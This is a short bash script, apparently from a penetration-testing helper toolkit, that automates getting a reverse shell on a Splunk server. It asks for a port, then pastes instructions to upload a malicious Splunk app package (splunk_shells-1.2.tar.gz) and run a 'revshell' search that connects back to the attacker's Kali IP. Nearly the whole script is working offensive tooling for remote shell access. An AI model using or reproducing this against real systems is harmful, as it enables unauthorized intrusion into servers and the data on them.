#!/bin/bash

: '
Create splunk rev shell
'

REV_FOLDER="${SCRIPT_DIR}/shell/msfvenom/.files/reverse_shell_splunk"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

paste_command "# upload ${REV_FOLDER}/splunk_shells-1.2.tar.gz -> click on the gear icon on the top left -> Install app from file -> Upload file"
xdotool key Return

paste_command "#after uploading and restarting the app search for '| revshell std ${KALI_IP} ${PORT}'"
xdotool key Return

